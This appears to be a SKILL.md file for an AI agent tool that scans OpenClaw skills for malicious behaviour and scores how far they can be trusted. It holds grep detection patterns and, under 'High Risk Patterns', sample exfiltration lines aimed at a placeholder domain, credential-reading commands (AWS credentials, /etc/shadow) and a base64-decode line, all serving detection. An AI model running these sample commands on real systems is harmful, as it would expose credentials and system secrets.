---
name: skill-security-scanner
description: "Scan OpenClaw skills for security issues, suspicious permissions,
  and trust scoring. Use when: (1) Installing a new skill, (2) Auditing existing
  skills, (3) User asks if a skill is safe, (4) Before running untrusted
  skills."
---


# Skill Security Scanner

Scan OpenClaw skills for security issues, suspicious patterns, and give a trust score. Helps users make informed decisions about which skills to trust.

## When to Use

- **Before installing** a new skill from ClawHub
- **Auditing** existing installed skills
- **User asks** "is this skill safe?"
- **After ClawHavoc** type incidents (malicious skills in ecosystem)
- **Before running** untrusted skills

## Quick Reference

| Command | Purpose |
|---------|---------|
| `scan-skill <path>` | Scan a single skill |
| `scan-all` | Scan all skills in workspace |
| `trust-score <path>` | Get quick trust score (0-100) |
| `list-permissions <path>` | List all requested permissions |

## Scanning Strategy

### 1. Check Metadata (Frontmatter)

Look for:
- `bins` - CLI tools skill needs
- `env` - Environment variables (API keys, tokens)
- `requires.config` - Required config settings
- `requires.bins` - Binary dependencies

**Red flags:**
- Skills requesting many bins without clear purpose
- Env vars for sensitive services (AWS keys, database passwords)
- Config requiring admin/elevated permissions

### 2. Analyze SKILL.md Content

**Suspicious patterns to detect:**

```bash
# Network calls to unknown domains
grep -E "(curl|wget|http|https).*\.com" SKILL.md
grep -E "fetch\(|axios\(" SKILL.md

# File system access beyond declared scope
grep -E "rm -rf|dd |mkfs" SKILL.md

# Credential access
grep -E "password|secret|token|key" SKILL.md

# Execution of downloaded code
grep -E "eval\(|exec\(|system\(" SKILL.md

# Base64 encoded commands
grep -E "base64|-enc|-encode" SKILL.md
```

### 3. Trust Score Calculation

Score from 0-100 based on:

| Factor | Weight | Criteria |
|--------|--------|----------|
| **Author reputation** | 20% | Known author? Official OpenClaw skill? |
| **Permission scope** | 30% | Minimal bins/envs? |
| **Code patterns** | 25% | No suspicious commands |
| **Update frequency** | 15% | Recently updated? |
| **Download count** | 10% | Popular = more scrutiny |

### 4. Risk Levels

| Score | Risk | Action |
|-------|------|--------|
| **80-100** | 🟢 Low | Safe to use |
| **60-79** | 🟡 Medium | Review before use |
| **40-59** | 🟠 High | Use with caution |
| **0-39** | 🔴 Critical | Don't use |

## Output Format

### Scan Result

```
🔍 Skill: <skill-name>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Trust Score: <score>/100 (<risk-level>)

📋 Permissions Requested:
   • bins: curl, jq
   • env: OPENWEATHER_API_KEY

⚠️ Issues Found:
   1. [MEDIUM] Requests network access but no clear purpose
   2. [LOW] No recent updates (6+ months)

✅ Positive Signs:
   • Official OpenClaw skill
   • Clear documentation
```

### Trust Report

Generate a full report:

```markdown
## Security Analysis: <skill-name>

### Score: <score>/100 (<risk-level>)

### Permissions Analysis
| Type | Requested | Risk |
|------|-----------|------|
| bins | curl, jq | Low |
| env | API_KEY | Medium |

### Code Pattern Analysis
- ✅ No suspicious execution patterns
- ✅ No credential access attempts  
- ⚠️ 2 network calls to external domains

### Recommendation
<RECOMMENDATION>
```

## Common Red Flags

### High Risk Patterns

1. **Network exfiltration**
   ```bash
   # Example: sending data to unknown servers
   # curl -X POST https://SUSPICIOUS-DOMAIN/exfil
   # fetch("https://data-collector.DOMAIN")
   ```

2. **Credential harvesting**
   ```bash
   # Example: reading credentials
   # cat ~/.aws/credentials
   # grep "password" /etc/shadow
   ```

3. **Persistence mechanisms**
   ```bash
   # Example: auto-start, cron, systemd
   # sudo crontab -l
   # systemctl enable
   ```

4. **Obfuscated code**
   ```bash
   # Example: base64 encoded commands
   echo "c3VkbyByb20gL3J0ZiAv" | base64 -d
   ```

### Medium Risk Patterns

1. **Excessive permissions** - More bins/envs than needed
2. **No documentation** - Unclear what skill does
3. **Outdated** - No updates in 6+ months
4. **Third-party dependencies** - Unknown npm/go packages

### Green Flags

1. ✅ Official OpenClaw skills (openclaw/skills)
2. ✅ Clear, specific permissions
3. ✅ Active maintenance (recent commits)
4. ✅ Open source with clear code
5. ✅ Known author with reputation

## Workflows

### Before Installing New Skill

```bash
# 1. Get skill path (ClawHub or local)
# 2. Run full scan
scan-skill /path/to/skill

# 3. Check trust score
trust-score /path/to/skill

# 4. Review issues
# 5. Decide: install / skip / investigate more
```

### Regular Security Audit

```bash
# Weekly: scan all installed skills
scan-all

# Monthly: generate full report
# Save to .learnings/ for documentation
```

### Quick Trust Check

```bash
# For quick decision
trust-score <path>

# If score < 60, do full scan
# If score < 40, don't use
```

## Integration with Other Skills

- Works with **self-improving-agent** - Log security findings
- Use **memory** - Remember trust scores for known skills
- Report findings to user before risky operations

## Best Practices

1. **Always scan** before installing untrusted skills
2. **Document** scan results in `.learnings/`
3. **Share** findings with community (anonymized)
4. **Update** trust scores when vulnerabilities found
5. **Trust but verify** - Don't rely solely on automated scanning

## Examples

### Example 1: Scanning Before Install

User wants to install "cool-new-skill" from ClawHub:

```
> scan-skill ./skills/cool-new-skill

🔍 Scanning: cool-new-skill
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Trust Score: 72/100 (🟡 Medium)

📋 Permissions:
   • bins: none
   • env: none

⚠️ Issues:
   • No recent updates (8 months)
   • Unknown author

✅ Positives:
   • Clear documentation
   • Minimal permissions

💡 Recommendation: Safe to try, monitor usage
```

### Example 2: Finding Malware

```
> scan-skill ./skills/suspicious-skill

🔍 Scanning: suspicious-skill
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Trust Score: 23/100 (🔴 CRITICAL)

📋 Permissions:
   • bins: curl, base64
   • env: API_KEY, SECRET_TOKEN

🚨 CRITICAL ISSUES FOUND:
   1. Network exfiltration pattern detected
   2. Credential access attempt
   3. Obfuscated commands (base64)

💀 Recommendation: DO NOT USE - Potential malware
```

### Example 3: Audit Report

```
> scan-all

📋 Scanning all skills in ~/.openclaw/workspace/skills/
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ github: 95/100 (safe)
⚠️ todoist: 68/100 (review needed)
✅ self-improving-agent: 92/100 (safe)
🔴 unknown-skill: 34/100 (remove recommended)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary: 2 safe, 1 review, 1 remove
```

## Related

- ClawHavoc incident (Feb 2026) - 341 malicious skills
- Agent Trust Hub - Third-party security tooling
- OpenClaw Security docs: docs.openclaw.ai/gateway/security
